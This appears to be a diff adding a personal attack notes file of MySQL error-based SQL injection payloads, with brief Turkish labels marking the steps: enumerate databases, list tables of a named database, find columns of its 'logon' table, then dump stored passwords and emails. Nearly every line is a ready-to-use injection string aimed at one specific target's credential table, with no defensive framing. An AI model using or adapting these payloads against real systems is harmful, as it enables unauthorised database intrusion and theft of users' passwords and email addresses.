@@ -1,0 +1,14 @@
+The used SELECT statements have a different number of columns
+db bulma
+' aND gTid_sUBseT(cONCat(0x7170627871,(SELeCt mID((schema_name),1,95) FRoM INFORMATION_SCHEMA.SCHEMATA liMIT 0,1),0x716a7a6271),2011)-- rkex
+&cat=21262' And GTID_SUbset(COnCaT(0x7170627871,(SElect MiD((schema_name),1,95) FRoM INFORMATION_SCHEMA.SCHEMATA liMiT 1,1),0x716a7a6271),4420)-- NAPl
+table adı bulma
+' anD GtiD_suBSET(COnCat(0x7170627871,(SeLEct miD((table_name),1,95) FrOm iNFORMATION_SCHEMA.TABLES WheRE table_schema iN (0x7468656f336d5f336d6462) lImiT 2,1),0x716a7a6271),4781)-- JKec
+' aNd gtiD_SUBSet(cONCAT(0x7170627871,(seleCT mID((table_name),1,95) fRom iNFORMATION_SCHEMA.TABLES wHerE table_schema iN (0x7468656f336d5f336d6462) LiMiT 3,1),0x716a7a6271),7437)-- Cinr
+colon bulma 
+logon tablosunun kolonlarını bulma
+' aNd GTid_sUBsET(coNCaT(0x7170627871,(seLECT Mid((column_name),1,95) fRom INFORMATION_SCHEMA.COLUMNS wHErE table_name=0x6c6f676f6e aNd table_schema=0x7468656f336d5f336d6462 limiT 1,1),0x716a7a6271),6584)-- lPsx
+' aNd GTid_sUBsET(coNCaT(0x7170627871,(seLECT Mid((column_name),1,95) fRom INFORMATION_SCHEMA.COLUMNS wHErE table_name=0x6c6f676f6e aNd table_schema=0x7468656f336d5f336d6462 limiT 5,1),0x716a7a6271),6584)-- lPsx
+dump yapma
+' anD GtId_sUbsET(cOncaT(0x7170627871,(SeLecT MId((password),1,95) fROm theo3m_3mdb.logon Order By id LIMIt 2,1),0x716a7a6271),6345)-- SGUW
+' aND Gtid_sUbSet(conCaT(0x7170627871,(selEcT mId((email),1,95) frOM theo3m_3mdb.logon oRDEr By id LiMIt 1,1),0x716a7a6271),8715)-- mEzL
